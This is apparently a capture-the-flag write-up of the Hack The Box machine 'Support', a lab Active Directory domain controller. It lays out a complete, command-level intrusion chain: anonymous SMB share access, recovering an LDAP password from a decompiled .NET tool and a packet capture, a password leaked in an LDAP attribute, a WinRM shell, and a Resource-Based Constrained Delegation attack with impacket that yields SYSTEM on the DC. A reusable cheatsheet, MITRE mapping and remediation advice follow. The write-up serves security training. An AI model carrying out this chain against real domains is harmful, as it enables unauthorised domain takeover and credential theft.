---
title: "Support"
platform: "Hack The Box"
category: "Active Directory"
difficulty: "Easy"
date: 2026-07-18
techniques: ["SMB Enumeration", ".NET Reverse Engineering", "LDAP Traffic Capture", "LDAP Enumeration", "WinRM", "GenericAll", "Resource-Based Constrained Delegation"]
description: "Anonymous SMB leaks a .NET tool whose LDAP password is recovered by capturing the bind traffic. LDAP enumeration exposes a second credential in the info attribute, and a GenericAll ACE over the DC drives an RBCD attack to full domain compromise."
lang: en
translation_key: support
---

| Info | Detail |
|------|--------|
| Platform | Hack The Box — Machines |
| Category | Active Directory (Windows Server 2022 Domain Controller) |
| Difficulty | Easy |
| Flags | user + root (redacted — HTB flags rotate per spawn) |

---

## Objective
Compromise the `support.htb` domain by chaining anonymous SMB, reverse engineering a .NET tool to recover an LDAP credential, extracting a second credential from an LDAP attribute, and abusing a `GenericAll` ACE over the Domain Controller through Resource-Based Constrained Delegation (RBCD).

---

## Context
Support is a first real Active Directory box: unlike a standalone Windows host, the target is a Domain Controller and the path runs through domain-native services (LDAP, Kerberos, SMB) rather than a local application. It exercises the full internal-engagement arc — anonymous enumeration, credential recovery via reverse engineering, authenticated LDAP enumeration, and an ACL-based privilege escalation that ends at the DC.

The kill chain is:

1. Anonymous SMB exposes a `support-tools` share containing a custom `UserInfo.exe` (.NET).
2. Decompilation reveals an obfuscated LDAP password (Base64 + double XOR); the exact value is recovered by capturing the cleartext LDAP bind with `tcpdump`.
3. Authenticated LDAP enumeration exposes a second credential in the `info` attribute of the `support` user, who belongs to `Remote Management Users` → WinRM shell (**user flag**).
4. The `support` user (via `Shared Support Accounts`) holds `GenericAll` over the `DC$` object → RBCD attack impersonates `Administrator` → **root flag**.

---

## Reconnaissance

### Nmap
```bash
nmap -Pn -sC -sV 10.129.230.181
```
Key results (a classic Domain Controller fingerprint):
```
53/tcp   open  domain         Simple DNS Plus
88/tcp   open  kerberos-sec   Microsoft Windows Kerberos
389/tcp  open  ldap           AD LDAP (Domain: support.htb)
445/tcp  open  microsoft-ds
3268/tcp open  ldap           Global Catalog
5985/tcp open  http           Microsoft HTTPAPI (WinRM)
Host: DC; OS: Windows
```
DNS (53) + Kerberos (88) + LDAP (389/3268) + hostname `DC` together identify a Domain Controller. Domain: `support.htb`.

### SMB shares (anonymous)
```bash
smbclient -N -L //10.129.230.181/
```
```
        Sharename       Type      Comment
        support-tools   Disk      support staff tools
```
`support-tools` is a non-default share and is the target. Inside, all files are public tools except one:
```
UserInfo.exe.zip
```

---

## Exploitation

### 1 — Recover the .NET tool
```bash
smbclient -N //10.129.230.181/support-tools
smb: \> get UserInfo.exe.zip
smb: \> exit
unzip UserInfo.exe.zip
```
The archive contains a .NET assembly (`UserInfo.exe`) plus `Microsoft.Extensions.*` and `System.*` DLLs — a .NET application, which decompiles cleanly.

### 2 — Decompile and analyse
```bash
sudo apt install -y dotnet-sdk-8.0
dotnet tool install -g ilspycmd --version 8.0.0.7345
export PATH="$PATH:$HOME/.dotnet/tools"
DOTNET_ROLL_FORWARD=Major ilspycmd UserInfo.exe > UserInfo.cs
```
The `Protected` class holds an obfuscated password and its decoding logic:
```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsy076/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword() {
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    return Encoding.Default.GetString(array);
}
```
The algorithm is: Base64 decode → XOR with the repeating key `"armando"` → XOR with `0xDF`. The bind target is `LDAP://support.htb` as `support\ldap`.

### 3 — Recover the exact LDAP password
Reimplementing the decode in Python produced a byte (`0xF0`) that could not be reliably reproduced as text, because `.NET Core`'s `Encoding.Default` is UTF-8, in which `0xF0` is invalid. Rather than guess the encoding, the exact password was captured from the wire — the LDAP simple bind sends credentials in cleartext on port 389:
```bash
sudo tcpdump -i tun0 -w /tmp/ldap.pcap host 10.129.230.181 and port 389 &
mono UserInfo.exe find -first a          # triggers the LDAP bind
strings /tmp/ldap.pcap | grep -A2 support
```
```
support\ldap
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
Validated:
```bash
netexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
# [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### 4 — LDAP enumeration → second credential (user flag)
Query the `support` user's attributes:
```bash
netexec ldap 10.129.230.181 -u ldap -p '<ldap_pass>' --query "(sAMAccountName=support)" ""
```
The `info` attribute leaks a password, and `memberOf` shows the group that grants remote access:
```
info      : Ironside47pleasure40Watchful
memberOf  : CN=Shared Support Accounts,...
            CN=Remote Management Users,CN=Builtin,...
```
`Remote Management Users` grants WinRM logon:
```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
# PS> type C:\Users\support\Desktop\user.txt   → user flag
```

### 5 — Privilege escalation: GenericAll → RBCD (root flag)
Reading the DACL on the `DC$` object shows the `support` user's group with full control:
```bash
netexec ldap 10.129.230.181 -u support -p '<info_pass>' -M daclread -o TARGET='DC$' ACTION=read
```
```
Access mask : FullControl (0xf01ff)   ← GenericAll
Trustee     : Shared Support Accounts
```
`GenericAll` over a computer object enables RBCD. Execute the attack (time sync first, Kerberos is clock-sensitive):
```bash
sudo ntpdate -u 10.129.230.181

# 1. Create a machine account (default ms-DS-MachineAccountQuota = 10 allows this)
impacket-addcomputer support.htb/support:'<info_pass>' \
  -computer-name 'FAKE01$' -computer-pass 'Fake12345!' -dc-host dc.support.htb

# 2. Configure delegation from FAKE01$ to DC$
impacket-rbcd support.htb/support:'<info_pass>' \
  -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write -dc-ip 10.129.230.181

# 3. Request a Kerberos ticket impersonating Administrator (S4U2Proxy)
impacket-getST -spn 'cifs/dc.support.htb' -impersonate Administrator \
  'support.htb/FAKE01$:Fake12345!' -dc-ip 10.129.230.181

# 4. Use the ticket to get SYSTEM on the DC
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
# C:\> whoami → nt authority\system
# C:\> type C:\Users\Administrator\Desktop\root.txt   → root flag
```
> **Domain Controller compromised — full domain compromise achieved.** (Flags redacted; HTB flags rotate per spawn.)

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|----|
| Discovery | Network Share Discovery | T1135 |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 |
| Credential Access | Network Sniffing (LDAP bind) | T1040 |
| Discovery | Account / Permission Groups Discovery | T1069 |
| Initial Access / Lateral Movement | Valid Accounts | T1078 |
| Lateral Movement | Remote Services: Windows Remote Management | T1021.006 |
| Privilege Escalation | Domain Policy Modification / RBCD abuse | T1484 |
| Credential Access | Steal or Forge Kerberos Tickets (S4U) | T1558 |

**Related weaknesses:** CWE-522 (Insufficiently Protected Credentials), CWE-266/CWE-269 (Improper Privilege Management — `GenericAll` on the DC object).

---

## Key Concepts Learned

| Concept | Takeaway |
|---------|----------|
| .NET decompilation | .NET assemblies decompile to near-source C# (`ilspycmd`), exposing hardcoded secrets and logic. |
| Encoding vs. the wire | When decoded bytes are ambiguous (`Encoding.Default`), capture the cleartext protocol instead of guessing — LDAP simple bind sends credentials unencrypted. |
| LDAP free-text fields | `info`, `description`, and `comment` on user objects frequently leak passwords, readable by any authenticated user. |
| Remote Management Users | Membership grants WinRM logon (5985) → `evil-winrm`. |
| GenericAll = FullControl | BloodHound's `GenericAll` is the DACL's `FullControl (0xf01ff)`; over a computer object it enables RBCD. |
| RBCD | Writing `msDS-AllowedToActOnBehalfOfOtherIdentity` lets an attacker-controlled machine impersonate any user (incl. Administrator) via S4U2Proxy. |
| MachineAccountQuota | Default value 10 lets any domain user create machine accounts — a prerequisite for RBCD/Shadow Credentials. |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port/service discovery, DC fingerprinting |
| smbclient | Anonymous SMB share enumeration and file retrieval |
| ilspycmd | .NET decompilation |
| tcpdump / strings | Capture and extract the cleartext LDAP bind password |
| netexec | Credential validation, LDAP query, DACL read |
| evil-winrm | WinRM shell as the `support` user |
| impacket (addcomputer, rbcd, getST, psexec) | RBCD attack chain to the DC |

---

## Commands & Techniques Cheatsheet
```bash
# Recon
nmap -Pn -sC -sV <IP>
smbclient -N -L //<IP>/
smbclient -N //<IP>/support-tools        # get UserInfo.exe.zip ; exit
unzip UserInfo.exe.zip

# .NET decompile
DOTNET_ROLL_FORWARD=Major ilspycmd UserInfo.exe > UserInfo.cs

# Capture the exact LDAP bind password
sudo tcpdump -i tun0 -w /tmp/ldap.pcap host <IP> and port 389 &
mono UserInfo.exe find -first a
strings /tmp/ldap.pcap | grep -A2 support

# LDAP enumeration
netexec ldap <IP> -u ldap -p '<pass>' --query "(sAMAccountName=support)" ""

# WinRM shell
evil-winrm -i <IP> -u support -p '<info_pass>'

# DACL read
netexec ldap <IP> -u support -p '<info_pass>' -M daclread -o TARGET='DC$' ACTION=read

# RBCD chain
sudo ntpdate -u <IP>
impacket-addcomputer DOMAIN/support:'<info_pass>' -computer-name 'FAKE01$' -computer-pass 'Fake12345!' -dc-host dc.<domain>
impacket-rbcd DOMAIN/support:'<info_pass>' -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write -dc-ip <IP>
impacket-getST -spn 'cifs/dc.<domain>' -impersonate Administrator 'DOMAIN/FAKE01$:Fake12345!' -dc-ip <IP>
export KRB5CCNAME=Administrator@cifs_dc.<domain>@<DOMAIN>.ccache
impacket-psexec -k -no-pass DOMAIN/Administrator@dc.<domain>
```

---

## Remediation
- **Never store credentials in shared files or binaries.** The `UserInfo.exe` password and the `info`-attribute password are both cleartext secrets in readable locations.
- **Disable anonymous SMB access.** The `support-tools` share should require authentication.
- **Use LDAPS (636) and enforce channel binding/signing** so bind credentials are not exposed on the wire.
- **Audit and remove excessive ACLs.** No support group should hold `GenericAll` over the Domain Controller object — apply least privilege to AD ACEs.
- **Set `ms-DS-MachineAccountQuota` to 0**, preventing standard users from creating machine accounts (blocks RBCD/Shadow Credentials).

---

## Reflection
Support is a strong introduction to real Active Directory tradecraft because no single step is an exploit — each is an abuse of configuration and trust. The most instructive moment is credential recovery: reimplementing the .NET decode in Python produced an ambiguous byte, and the clean resolution was not more reverse engineering but capturing the protocol on the wire, where the password travels in cleartext. The escalation reinforces the central AD lesson: identity and ACL relationships, not memory-corruption bugs, are the real attack surface — a single `GenericAll` ACE over the DC collapses the entire domain. Reading that DACL by hand (rather than only trusting BloodHound's graph) makes clear what the tooling abstracts, which is exactly the understanding that transfers to real engagements.
